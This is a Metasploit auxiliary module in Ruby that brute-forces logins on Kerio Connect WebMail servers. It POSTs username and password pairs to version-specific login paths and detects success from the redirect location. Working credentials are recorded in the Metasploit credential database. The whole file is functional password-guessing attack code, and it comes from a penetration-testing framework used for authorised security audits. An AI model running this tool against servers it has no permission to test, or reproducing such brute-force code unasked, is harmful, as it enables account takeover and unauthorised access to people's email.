##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Kerio Connect WebMail Brute Force Utility',
      'Description' => %q{
        This module tests credentials on Kerio Connect WebMail servers.
      },
      'Author' => [
        'mekhalleh (RAMELLA Sébastien)' # https://www.pirates.re/
      ],
      'License' => MSF_LICENSE,
      'Actions' => [
        ["Kerio Connect (version: #{Gem::Version.new('7.3.3')})",
          {
            'Description' => "Kerio Connect WebMail (version:#{Gem::Version.new('7.3.3')})",
            'AuthPath' => '/webmail/dologin.php',
            'LoginCheck' => /reason=failure/
          }
        ],
        ["Kerio Connect (version: #{Gem::Version.new('7.4.3')})",
          {
            'Description' => "Kerio Connect WebMail (version:#{Gem::Version.new('7.4.3')})",
            'AuthPath' => '/webmail/login/dologin',
            'LoginCheck' => /reason=failure/
          }
        ],
      ],
      'DefaultAction' => "Kerio Connect (version: #{Gem::Version.new('7.3.3')})",
      'DefaultOptions' => {
        'SSL' => true
      }
    ))

    register_options([
      OptAddress.new('RHOST', [true, 'The target address']),
      Opt::RPORT(443)
    ])

    deregister_options('BLANK_PASSWORDS', 'RHOSTS')
  end

  def setup
    ## Here's a weird hack to check if each_user_pass is empty or not
    ## apparently you cannot do each_user_pass.empty? or even inspect() it
    isempty = true
    each_user_pass do | user |
      isempty = false
      break
    end
    raise ArgumentError, "No username/password specified" if isempty
  end

  # ------------------------------------------------------------------------- #

  def message
    return "#{vhost}:#{rport} -"
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)
   
    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def try_user_pass(opts)
    user = opts[:user]
    pass = opts[:pass]
    auth_path = opts[:auth_path]
    login_check = opts[:login_check]
    vhost = opts[:vhost]

    data = "kerio_username=#{user}&kerio_password=#{pass}&kerio_mode=full-or-mini"
    begin
      received = send_request_cgi({
        'uri' => auth_path,
        'method' => 'POST',
        'data' => data
      })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{message} HTTP Connection Failed, Aborting")
      return :abort
    end

    unless(received)
      print_error("#{message} HTTP Connection Error, Aborting")
      return
    end

    if received.code == 302
      return :skip_pass if(received.headers['location'] =~ login_check)
      print_good("#{message} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
      report_cred(
        ip: vhost,
        port: datastore['RPORT'],
        service_name: action.name,
        user: user,
        password: pass
      )
      return :next_user
    end
  end

  # ------------------------------------------------------------------------- #

  def run
    vhost = datastore['VHOST'] || datastore['RHOST']
    print_status("#{message} Testing #{action.name}")

    begin
      each_user_pass do | user, pass |
        next if (user.blank?) or (pass.blank?)
        vprint_status("#{message} Trying #{user} : #{pass}")
        try_user_pass({
          user: user,
          pass: pass,
          auth_path: action.opts['AuthPath'],
          login_check: action.opts['LoginCheck'],
          vhost: vhost
        })
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
      print_error("#{message} HTTP Connection Error, Aborting")
    end
  end

end
